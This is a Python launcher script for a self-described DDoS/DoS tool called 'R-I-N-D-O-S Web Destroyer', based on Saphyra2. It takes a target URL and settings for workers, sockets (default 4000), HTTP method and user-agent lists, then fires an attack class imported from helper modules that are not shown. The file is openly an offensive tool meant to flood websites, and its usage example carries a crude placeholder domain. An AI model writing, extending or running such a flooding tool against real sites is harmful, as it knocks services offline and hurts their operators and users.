#####################################################################################################
#                                       R-I-N-D-O-S                                                 #
#                             ---------------------------------                                     #
#                                       Web Destroyer                                               #
#                                       DDos and Dos                                                #
#                                                                                                   #
#                        R     I    N    K    A            D     E    V                             #
#                                        based on Saphyra2                                          #
#####################################################################################################

################# IMPORTING THINGS ##################################
from multiprocessing import Process, Manager, Pool                  #
from utils.rindos import Rindos                                     #
from utils.striker import Striker                                   #
import sys, getopt, random, time, os, urllib.parse, ssl, http.client#
#####################################################################                 

#################### VARIABLES #
DEBUG = False                  #
                               #
HTTPCLIENT = http.client       #
                               #
METHOD_GET  = 'get'            #
METHOD_POST = 'post'           #
METHOD_RAND = 'random'         #
                               #
JOIN_TIMEOUT=1.0               #
                               #
DEFAULT_WORKERS=50             #
DEFAULT_SOCKETS=4000           #
################################

############ GET USERAGENTS ################
with open('important/userAgents.txt') as f:#
    USER_AGENT_PARTS = f.readlines()       #
############################################

def usage():
    print("USAGE - python3 main.py url")
    print("EXAMPLE - python3 main.py https://ilovedicks.com/")
    print("\a")
    print("""
         ...          ...          ...  
                                        
          .                             
         .,''',,''''',,,,',,,,'                     R-I-N-D-O-S
          ....................          --------------------------------------------
         ..   ..  ....             .                Web Destroyer
         ''...';'.';:'.           .'.               DDos and Dos
         .....',...;c'  ..        .'.   
         .'....'...;c,. ..        .'.            
         .'...',...:c,  ..        .'.         R   I   N   K  A      D  E  V
         .....',...;:'  ..        ...   
  .      .'.'.,;...,;.  ..        ...   
  .      ..',.;:..';:'  ..        ...               based on saphyra2
      ................    ....     .... 
      ...       ...        ...       .. 
          """)
    
def error(msg):
    # print help information and exit:
    sys.stderr.write(str(msg+"\n"))
    usage()
    sys.exit(2)

def main():
    try:
        if len(sys.argv) < 2:
            error('Please supply at least the URL')

        url = sys.argv[1]

        if url == '-h':
            usage()
            sys.exit()

        if url[0:4].lower() != 'http':
            error("Invalid URL supplied")

        if url == None:
            error("No URL supplied")

        opts, args = getopt.getopt(sys.argv[2:], "dhw:s:m:u:", ["debug", "help", "workers", "sockets", "method", "useragents" ])

        workers = DEFAULT_WORKERS
        socks = DEFAULT_SOCKETS
        method = METHOD_GET

        uas_file = None
        useragents = []

        for o, a in opts:
            if o in ("-h", "--help"):
                usage()
                sys.exit()
            elif o in ("-u", "--useragents"):
                uas_file = a
            elif o in ("-s", "--sockets"):
                socks = int(a)
            elif o in ("-w", "--workers"):
                workers = int(a)
            elif o in ("-d", "--debug"):
                global DEBUG
                DEBUG = True
            elif o in ("-m", "--method"):
                if a in (METHOD_GET, METHOD_POST, METHOD_RAND):
                    method = a
                else:
                    error("method {0} is invalid".format(a))
            else:
                error("option '"+o+"' doesn't exists")


        if uas_file:
            try:
                with open(uas_file) as f:
                    useragents = f.readlines()
            except EnvironmentError:
                    error("cannot read file {0}".format(uas_file))

        rindos = Rindos(url)
        rindos.useragents = useragents
        rindos.nr_workers = workers
        rindos.method = method
        rindos.nr_sockets = socks

        rindos.fire()

    except getopt.GetoptError as err:
        # print help information and exit:
        sys.stderr.write(str(err))
        usage()
        sys.exit(2)

if __name__ == "__main__":
    main()